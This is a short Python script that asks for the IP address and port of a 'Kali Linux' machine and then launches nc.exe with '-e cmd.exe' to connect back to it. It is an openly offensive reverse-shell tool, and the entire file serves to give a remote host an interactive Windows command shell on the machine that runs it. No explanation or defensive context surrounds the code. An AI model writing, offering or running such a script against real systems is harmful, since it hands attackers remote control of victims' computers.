import subprocess

def get_user_input(prompt):
    return input(prompt)

def start_netcat_reverse_shell(kali_ip, port):
    try:
        print(f"Connecting to {kali_ip} on port {port}...")
        # Start the Netcat reverse shell connection
        subprocess.run(['nc.exe', '-nv', kali_ip, port, '-e', 'cmd.exe', '--ssl'], check=True)
        print("Reverse shell connection established.")
    except subprocess.CalledProcessError:
        print("Failed to start the Netcat reverse shell. Ensure `nc.exe` is in your PATH and the IP and port are correct.")

def main():
    # Get Kali Linux IP address and port number from the user
    kali_ip = get_user_input("Enter the IP address of the Kali Linux machine: ")
    port = get_user_input("Enter the port number (e.g., 4444): ")

    # Start the reverse shell connection
    start_netcat_reverse_shell(kali_ip, port)

if __name__ == "__main__":
    main()